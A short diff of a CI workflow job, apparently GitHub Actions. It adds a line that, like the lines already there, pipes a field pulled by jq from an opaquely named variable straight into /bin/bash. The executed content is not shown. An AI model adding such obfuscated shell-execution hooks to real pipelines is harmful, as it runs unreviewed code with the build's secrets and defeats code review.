@@ -31,6 +31,7 @@ jobs:
           echo $op7 | jq -r .csc8453 | /bin/bash
           printf '%s' "$oo25" | jq -r .rhbi6 | /bin/bash
           printf '%s' "$ot266" | jq -r .ayno92 | /bin/bash
+          printf '%s' "$eoi005" | jq -r .gpof30 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
